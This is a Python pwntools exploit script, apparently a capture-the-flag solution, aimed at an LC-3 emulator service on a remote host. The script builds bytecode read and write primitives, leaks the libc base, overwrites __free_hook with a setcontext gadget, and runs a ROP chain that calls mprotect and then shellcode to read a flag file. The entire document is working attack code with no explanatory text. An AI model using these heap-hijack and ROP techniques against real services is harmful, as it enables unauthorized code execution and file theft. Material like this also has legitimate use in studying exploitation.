from pwn import *
import re

#context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.log_level = "debug"
#env = {'LD_PRELOAD': './libc.so.6'}

libc = ELF('./libc-2.23.so')

p = remote("192.168.1.147", 23333)
#p = process(['./parent','./pwn'])
#p = process('./pwn_dbg')

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def write_primitive(addr, value):
    with context.local(endian='big'):
        code = p16(0x3000) # .ORIG 0X3000
        code += p16(0x260D) # LD R3,X1 change
        code += p16(0x240D) # LD R2,Y1 change
        code += p16(0x220D) # LD R1,Z1 change
        code += p16(0x2009) # LD R0,X2 change
        code += p16(0x2E0E) # LD R7
        code += p16(0x70D1) # STR R0, R3, R2, R1
        code += p16(0x1261) # ADD, R1
        code += p16(0x2E0A) # LD, R7, Z1 change
        code += p16(0x70D1) # STR R0, R3, R2, R1
        code += p16(0x1261) # ADD R1
        code += p16(0x2E06) # LD, R7
        code += p16(0x70D1) # STR 
        code += p16(0xF025) # HALT
        code += p16(addr >> 48)
        code += p16((addr & 0xFFFFFFFFFFFF) >> 32)
        code += p16((addr & 0xFFFFFFFF) >> 16)
        code += p16(addr & 0xFFFF)
        code += p16((value & 0xFFFFFFFFFFFF) >> 32)
        code += p16((value & 0xFFFFFFFF) >> 16)
        code += p16(value & 0xFFFF)
        return code

def read_primitive(addr):
    with context.local(endian='big'):
        code = p16(0x3000)
        code += p16(0x260D) # LD R3, X
        code += p16(0x240D) # LD R2, Y
        code += p16(0x220D) # LD R1
        code += p16(0x2009) # LD R0
        code += p16(0x60D1) # LDR R0, R3, R2, R1
        code += p16(0xF021) # OUT
        code += p16(0x1261) # ADD R1, R1
        code += p16(0x60D1) # LDR R0, R3, R2, R1
        code += p16(0xF021) # OUT
        code += p16(0x1261) # ADD
        code += p16(0x60D1) # LDR
        code += p16(0xF021) # OUT
        code += p16(0xF025) # HALT
        code += p16(addr >> 48)
        code += p16((addr & 0xFFFFFFFFFFFF) >> 32)
        code += p16((addr & 0xFFFFFFFF) >> 16)
        code += p16(addr & 0xFFFF)
    return code

def convert_addr(addr):
    return p16(addr & 0xffff) + p16((addr & 0xFFFFFFFF) >> 16) + p16(addr >> 32) + '\x00\x00'

def swap(content):
    if (len(content) % 2) is not 0:
        content += "\x00"
    result = ""
    for i in range(0, len(content), 2):
        result += content[i+1] + content[i]
    return result

def prepare_rop():
    with context.local(endian='big'):
        header = p16(0x0000)
        addr = libc.address + 0x5c9000
        rsp = libc.address + 0x5c9000 + 0x200

        code = '\x00'
        code = code.ljust(0x68, "\x00")
        code += convert_addr(addr) #rdi
        code += convert_addr(0x1000) #rsi
        code = code.ljust(0x88, "\x00")
        code += convert_addr(0x7) #rdx
        code = code.ljust(0xa0, "\x00")
        code += convert_addr(rsp) #rsp
        code += convert_addr(libc.symbols['mprotect']) # rcx
        code = code.ljust(0x200-0x10, "\x00")
        code += convert_addr(addr + 0x208) # ret addr
        code = code.ljust(0x208-0x10,'\x00')
    code += swap(asm(#shellcraft.amd64.linux.cat('./flag')
                     shellcraft.amd64.linux.open('/home/pwn/pwn/flag')+
                     shellcraft.amd64.linux.read(5,rsp+0x200,35)+
                     shellcraft.amd64.linux.write(1,rsp+0x200,35)
                     )) # shellcode

    return header + code

def do_exit():
    with context.local(endian='big'):
        code = p16(0x3000)
        code += p16(0xf026) # EXIT
    return code

# leak libc    ------------------------  the stdin
off = (-0x10 - 0x5c9000 + 0x3c5710 + 2) / 2
off = 0x10000000000000000 + off
#print hex(off)
image1 = read_primitive(off)
#gdb.attach(p)
p.sendafter("Input the code: ", image1)
content = ru("STOP")
leak_libc = u64(content.ljust(8,'\x00'))
info_addr("leak_libc", leak_libc)
libc.address = leak_libc - libc.symbols['_IO_2_1_stdin_']
log.info('libc:'+hex(libc.address))


# set freehook -> setcontext_gadget
off = (-0x10 - 0x5c9000 + libc.symbols['__free_hook'] - libc.address + 2) / 2
off = 0x10000000000000000 + off
setcontext_gadget = libc.address + 0x47b85    #if segment fault , modify this addr part
image2 = write_primitive(off, setcontext_gadget)

p.sendafter("Input the code: ", image2)

# prepare_rop
image3 = prepare_rop()
p.sendafter("Input the code: ", image3)

# trigger free and go to rop
image4 = do_exit()
#gdb.attach(p)
p.sendafter("Input the code: ", image4)
#p.sendline("cat flag")

p.interactive()
